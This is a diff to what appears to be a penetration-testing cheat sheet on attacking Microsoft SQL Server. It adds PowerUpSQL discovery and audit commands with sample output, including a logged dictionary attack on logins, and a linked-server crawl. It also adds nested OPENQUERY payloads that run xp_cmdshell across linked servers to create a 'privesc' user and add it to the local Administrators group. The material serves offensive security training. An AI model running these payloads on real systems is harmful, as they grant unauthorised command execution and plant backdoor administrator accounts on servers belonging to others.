@@ -187,9 +187,30 @@ PS C:\>: Get-SQLInstanceBroadcast 						-- Returns SQL Server instances from UDP
 PS C:\>: Get-SQLInstanceDomain -Verbose | Format-Table -AutoSize		-- Discover domain SQL Server Instances
 PS C:\>: Get-SQLInstanceDomain -Verbose -DomainAccount sqlsvc			-- List SQL Servers using a specific domain account	
 
+PS C:\> Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose			-- List accessible SQL Servers on the domain using the windows domain account running the Powershell console
 
-Finding Domain SQL Servers to Log Into
-> https://blog.netspi.com/identifying-domain-sql-servers-configured-with-weak-passwords-on-scale-using-powerupsql/
+	VERBOSE: db-mgmt.testdomain.local,1433 : Connection Failed.
+	VERBOSE: db-mssql.testdomain.local,1433 : Connection Success.
+	VERBOSE: dB-sql1.testdomain.local,1433 : Connection Failed.
+
+	ComputerName           : db-mssql.corp.local
+	Instance               : db-mssql
+	DomainName             : testdomain
+	ServiceProcessID       : 1808
+	ServiceName            : MSSQLSERVER
+	ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
+	AuthenticationMode     : Windows and SQL Server Authentication
+	ForcedEncryption       : 0
+	Clustered              : No
+	SQLServerVersionNumber : 14.0.1000.169
+	SQLServerMajorVersion  : 2017
+	SQLServerEdition       : Developer Edition (64-bit)
+	SQLServerServicePack   : RTM
+	OSArchitecture         : X64
+	OsVersionNumber        : SQL
+	Currentlogin           : testdomain\testuser
+	IsSysadmin             : No
+	ActiveSessions         : 1
 
 
 • Tips: if you can list the servers belonging to a Windows domain, you should be able to identify database server based on their naming convention.
@@ -197,7 +218,7 @@ Examples:
 	SQLDB-PRD-01.company-domain
 	DBSRV-PRD.company-domain
 	MSSQLSRV2K14-PRD-.company-domain
-  WinSql2K12-12.company-domain
+	WinSql2K12-12.company-domain
 	<snip>
 
 
@@ -744,11 +765,121 @@ Automatic check with PowerUP SQL - 'Invoke-SQLDumpInfo' module (https://github.c
 
 
 Automatic check with PowerUP SQL - 'Invoke-SQLAudit' module (https://github.com/NetSPI/PowerUpSQL)
-----------------------------------------------------------------------------------------	  
+---------------------------------------------------------------------------------------------------
 • This can be used to review the SQL Server and databases for common configuration weaknesses and provide a vulnerability report along with recommendations for each item.
 
   PS C:\> Invoke-SQLAudit -Verbose -Instance WIN-F820SQBBVJR -Username sa -Password Test1234
 
+  PS C:\> Invoke-SQLAudit -Verbose -Instance db-MSSQL		--If we don't set the username/password, it will use the domain account credentials running the PowerShell session
+	VERBOSE: LOADING VULNERABILITY CHECKS.
+	VERBOSE: RUNNING VULNERABILITY CHECKS.
+	VERBOSE: db-MSSQL : RUNNING VULNERABILITY CHECKS...
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: Default SQL Server Login Password
+	VERBOSE: db-MSSQL : No named instance found.
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: Default SQL Server Login Password
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: Weak Login Password
+	VERBOSE: db-MSSQL : CONNECTION SUCCESS.
+	VERBOSE: db-MSSQL - Getting supplied login...
+	VERBOSE: db-MSSQL : Enumerating principal names from 10000 principal IDs..
+	VERBOSE: db-MSSQL - Performing dictionary attack...
+	VERBOSE: db-MSSQL - Failed Login: User = sa Password = sa
+	VERBOSE: db-MSSQL - Failed Login: User = ##MS_SQLResourceSigningCertificate## Password = ##MS_SQLResourceSigningCertificate##
+	VERBOSE: db-MSSQL - Failed Login: User = ##MS_SQLReplicationSigningCertificate## Password = ##MS_SQLReplicationSigningCertificate##
+	VERBOSE: db-MSSQL - Failed Login: User = ##MS_SQLAuthenticatorCertificate## Password = ##MS_SQLAuthenticatorCertificate##
+	VERBOSE: db-MSSQL - Failed Login: User = ##MS_PolicySigningCertificate## Password = ##MS_PolicySigningCertificate##
+	VERBOSE: db-MSSQL - Failed Login: User = ##MS_SmoExtendedSigningCertificate## Password = ##MS_SmoExtendedSigningCertificate##
+	VERBOSE: db-MSSQL - Failed Login: User = ##MS_PolicyEventProcessingLogin## Password = ##MS_PolicyEventProcessingLogin##
+	VERBOSE: db-MSSQL - Failed Login: User = ##MS_PolicyTsqlExecutionLogin## Password = ##MS_PolicyTsqlExecutionLogin##
+	VERBOSE: db-MSSQL - Failed Login: User = ##MS_AgentSigningCertificate## Password = ##MS_AgentSigningCertificate##
+	VERBOSE: db-MSSQL - Failed Login: User = dbuser Password = dbuser
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: Weak Login Password
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
+	VERBOSE: db-MSSQL : CONNECTION SUCCESS.
+	VERBOSE: db-MSSQL : - No logins could be impersonated.
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: Excessive Privilege - Server Link
+	VERBOSE: db-MSSQL : CONNECTION SUCCESS.
+	VERBOSE: db-MSSQL : - No exploitable SQL Server links were found.
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: Excessive Privilege - Trusted Database
+	VERBOSE: db-MSSQL : CONNECTION SUCCESS.
+	VERBOSE: db-MSSQL : - No non-default trusted databases were found.
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining
+	VERBOSE: db-MSSQL : CONNECTION SUCCESS.
+	VERBOSE: db-MSSQL : - The database master has ownership chaining enabled.
+	VERBOSE: db-MSSQL : - The database tempdb has ownership chaining enabled.
+	VERBOSE: db-MSSQL : - The database msdb has ownership chaining enabled.
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE
+	VERBOSE: db-MSSQL : CONNECTION SUCCESS
+	VERBOSE: db-MSSQL : Grabbing permissions for the master database...
+	VERBOSE: db-MSSQL : Grabbing permissions for the tempdb database...
+	VERBOSE: db-MSSQL : Grabbing permissions for the msdb database...
+	VERBOSE: db-MSSQL : - The current login doesn't have the CREATE PROCEDURE permission in any databases.
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: Excessive Privilege - xp_dirtree
+	VERBOSE: db-MSSQL : CONNECTION SUCCESS.
+	VERBOSE: db-MSSQL : - At least one principal has EXECUTE privileges on xp_dirtree.
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: Excessive Privilege - XP_DIRTREE
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: Excessive Privilege - xp_fileexist
+	VERBOSE: db-MSSQL : CONNECTION SUCCESS.
+	VERBOSE: db-MSSQL : - The  principal has EXECUTE privileges on xp_fileexist.
+	VERBOSE: db-MSSQL : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh.
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: DATABASE ROLE - DB_DDLAMDIN
+	VERBOSE: db-MSSQL : CONNECTION SUCCESS
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER
+	VERBOSE: db-MSSQL : CONNECTION SUCCESS
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: SEARCH DATA BY COLUMN
+	VERBOSE: db-MSSQL : CONNECTION SUCCESS
+	VERBOSE: db-MSSQL : - Searching for column names that match criteria...
+	VERBOSE: db-MSSQL : - No columns were found that matched the search.
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER
+	VERBOSE: db-MSSQL : Connection Success.
+	VERBOSE: db-MSSQL : Checking databases below for vulnerable stored procedures:
+	VERBOSE: db-MSSQL : - Checking master database...
+	VERBOSE: db-MSSQL : - 0 found in master database
+	VERBOSE: db-MSSQL : - Checking tempdb database...
+	VERBOSE: db-MSSQL : - 0 found in tempdb database
+	VERBOSE: db-MSSQL : - Checking msdb database...
+	VERBOSE: db-MSSQL : - 0 found in msdb database
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login
+	VERBOSE: db-MSSQL : Connection Success.
+	VERBOSE: db-MSSQL : Checking databases below for vulnerable stored procedures:
+	VERBOSE: db-MSSQL : - Checking master database...
+	VERBOSE: db-MSSQL : - 0 found in master database
+	VERBOSE: db-MSSQL : - Checking tempdb database...
+	VERBOSE: db-MSSQL : - 0 found in tempdb database
+	VERBOSE: db-MSSQL : - Checking msdb database...
+	VERBOSE: db-MSSQL : - 0 found in msdb database
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login
+	VERBOSE: db-MSSQL : START VULNERABILITY CHECK: Excessive Privilege - Auto Execute Stored Procedure
+	VERBOSE: db-MSSQL : Connection Success.
+	VERBOSE: db-MSSQL : Checking for autoexec stored procedures...
+	VERBOSE: db-MSSQL : No stored procedures were found configured to auto execute.
+	VERBOSE: db-MSSQL : COMPLETED VULNERABILITY CHECK.
+	VERBOSE: COMPLETED ALL VULNERABILITY CHECKS.
+
+	ComputerName  : db-MSSQL
+	Instance      : db-MSSQL
+	Vulnerability : Excessive Privilege - Database Ownership Chaining
+	Description   : Ownership chaining was found enabled at the server or database level.  Enabling ownership chaining can lead to unauthorized access to database resources.
+	Remediation   : Configured the affected database so the 'is_db_chaining_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING ON' is
+			used enable chaining.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING OFF;' can be used to disable chaining.
+	Severity      : Low
+	IsVulnerable  : Yes
+	IsExploitable : No
+	Exploited     : No
+	ExploitCmd    : There is not exploit available at this time.
+	Details       : The database master was found configured with ownership chaining enabled.
+	Reference     : https://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx,https://msdn.microsoft.com/en-us/library/bb669059(v=vs.110).aspx
+	Author        : Scott Sutherland (@_nullbind), NetSPI 2016
+	<SNIP>
 
 
 7.2. DB Privesc - Check for accounts which has the 'DB_OWNER' role on a 'TRUSTWORTHY' database owned by a sysadmin user
@@ -925,14 +1056,20 @@ Scenario: we add our db account into a high privileged role...privesc
 	SQL> SELECT * from master..sysservers;		//Enumerate linked databases 
 	SQL> SELECT * from sysoledbusers;		//Contains one row for each user and password mapping for the specified linked server (need admin priv)
 
-* Manual attack
-----------------
+* Manual attack (exmples)
+--------------------------
 	SQL> SELECT * FROM [LinkedServer].[Database].[Schema].[ObjectName];
 	SQL> SELECT * FROM [SQLSRVPROD01\INSTANCE01].Database_name.Schema_name.Table_name;
 	
-	SQL> SELECT * FROM openquery("DB-Linked-Instance",'select * from master..sysservers');
-	SQL> SELECT * FROM openquery("DB-Linked-Instance",'select * from master..syslogin');
+	SQL> SELECT * FROM openquery("DB-Linked-Instance1",'select * from master..sysservers');
+	SQL> SELECT * FROM openquery("DB-Linked-Instance1",'select * from master..syslogin');
 	
+	SQL> SELECT * FROM OPENQUERY("DB-Linked-Instance1", 'SELECT * FROM OPENQUERY("DB-Linked-Instance2", ''SELECT * FROM OPENQUERY("DB-Linked-Instance3", ''''SELECT @@Servername'''')'')') 
+	SQL> SELECT * FROM OPENQUERY("DB-Linked-Instance1", 'SELECT * FROM OPENQUERY("DB-Linked-Instance2", ''SELECT * FROM OPENQUERY("DB-Linked-Instance3", ''''SELECT 1;EXEC master..xp_cmdshell ''''''''net user privesc Privesc1! /add'''''''''''')'')') 
+	SQL> SELECT * FROM OPENQUERY("DB-Linked-Instance1", 'SELECT * FROM OPENQUERY("DB-Linked-Instance2", ''SELECT * FROM OPENQUERY("DB-Linked-Instance3", ''''SELECT 1;EXEC master..xp_cmdshell ''''''''net localgroup Administrators /add privesc'''''''''''')'')') 
+
+Note: https://blog.netspi.com/wp-content/uploads/2017/05/Technical-Article-Hacking-SQL-Server-Database-Links-Setup-and-Attack-Guide.pdf
+
 
 * Automatic checks and attacks with METASPLOIT - 'mssql_linkcrawler' module
 ----------------------------------------------------------------------------------
@@ -986,11 +1123,53 @@ Scenario: we add our db account into a high privileged role...privesc
 • Get-SQLServerLinkCrawl Crawls linked servers and supports SQL query and OS command execution.
   Examples:
   PS C:\> Get-SQLServerLinkCrawl -Verbose -Instance "10.1.1.1\SQLSERVER2008“
-  PS C:\> Get-SQLServerLinkCrawl -Verbose -Instance "10.1.1.1\SQLSERVER2008" -Query “select * from master..sysdatabases”
-  PS C:\> Get-SQLServerLinkCrawl -Verbose -Instance "10.1.1.1\SQLSERVER2008" -Query “exec master..xp_cmdshell ‘whoami’”	
+  PS C:\> Get-SQLServerLinkCrawl -Verbose -Instance "10.1.1.1\SQLSERVER2008" -Query "select * from master..sysdatabases"
+  PS C:\> Get-SQLServerLinkCrawl -Verbose -Instance "10.1.1.1\SQLSERVER2008" -Query "exec master..xp_cmdshell 'whoami'"	
+	
+  PS C:\Tools\PowerUpSQL> Get-SQLServerLinkCrawl -Instance db-mssql.corp.local -Verbose
+	VERBOSE: db-mssql.corp.local : Connection Success.
+	VERBOSE: db-mssql.corp.local : Connection Success.
+	VERBOSE: --------------------------------
+	VERBOSE:  Server: db-MSSQL
+	VERBOSE: --------------------------------
+	VERBOSE:  - Link Path to server: db-MSSQL
+	VERBOSE:  - Link Login: corp.local\testuser
+	VERBOSE:  - Link IsSysAdmin: 0
+	VERBOSE:  - Link Count: 1
+	VERBOSE:  - Links on this server: db-SQL
+	VERBOSE: db-mssql.corp.local : Connection Success.
+	VERBOSE: db-mssql.corp.local : Connection Success.
+	VERBOSE: --------------------------------
+	VERBOSE:  Server: db-SQL
+	VERBOSE: --------------------------------
+	VERBOSE:  - Link Path to server: db-MSSQL -> db-SQL
+	VERBOSE:  - Link Login: dblinkuser
+	VERBOSE:  - Link IsSysAdmin: 0
+	VERBOSE:  - Link Count: 1
+	VERBOSE:  - Links on this server: db-MGMT
+	VERBOSE: db-mssql.corp.local : Connection Success.
+	VERBOSE: db-mssql.corp.local : Connection Success.
+	VERBOSE: --------------------------------
+	VERBOSE:  Server: db-MGMT
+	VERBOSE: --------------------------------
+	VERBOSE:  - Link Path to server: db-MSSQL -> db-SQL -> db-MGMT
+	VERBOSE:  - Link Login: sqluser
+	VERBOSE:  - Link IsSysAdmin: 0
+	VERBOSE:  - Link Count: 1
+	VERBOSE:  - Links on this server: db-SQL2.corp2.local
+	VERBOSE: db-mssql.corp.local : Connection Success.
+	VERBOSE: db-mssql.corp.local : Connection Success.
+	VERBOSE: --------------------------------
+	VERBOSE:  Server: db-SQL2
+	VERBOSE: --------------------------------
+	VERBOSE:  - Link Path to server: db-MSSQL -> db-SQL -> db-MGMT -> db-SQL2.corp2.local
+	VERBOSE:  - Link Login: sa
+	VERBOSE:  - Link IsSysAdmin: 1
+	VERBOSE:  - Link Count: 0
+	VERBOSE:  - Links on this server:
+	<SNIP> 
 	
 
-	
 07.7. OS Privesc - From SYSDBA to a low (or high) privileged OS user using the extended stored procedure "XP_CMDSHELL"
 =======================================================================================================================================
 • Run unathorized remote OS commands as the SQL Server service account using the extended stored procedure xp_cmdshell.
@@ -1067,6 +1246,15 @@ Scenario: we add our db account into a high privileged role...privesc
 • Execute OS commands: xp_cmdshell	
   PS C:\> $Targets | Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10	
 
+  PS C:\> Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance DB-MSSQL
+	VERBOSE: Creating runspace pool and session states
+	VERBOSE: DB-MSSQL : Connection Success.
+	VERBOSE: DB-MSSQL : You are not a sysadmin. This command requires sysadmin privileges.
+	VERBOSE: Closing the runspace pool
+
+	ComputerName 	Instance    	CommandResults
+	------------ 	--------    	--------------
+	DB-MSSQL  	DB-MSSQL 	No sysadmin privileges.
 
 
 07.8. OS Privesc - From SYSDBA to a low (or high) privileged OS user using a custom CLR (Assembly) stored procedure execution
@@ -1196,7 +1384,6 @@ Step 3 - Use tool "METASPLOIT" or "RESPONDER" to start a SMB rogue authenticatio
 
 	
 	
-
 07.11. OS Privesc - Read files stored on the Windows server hosting the database using the "BULKADMIN" role and "INSERT" privilege
 =====================================================================================================================================
 
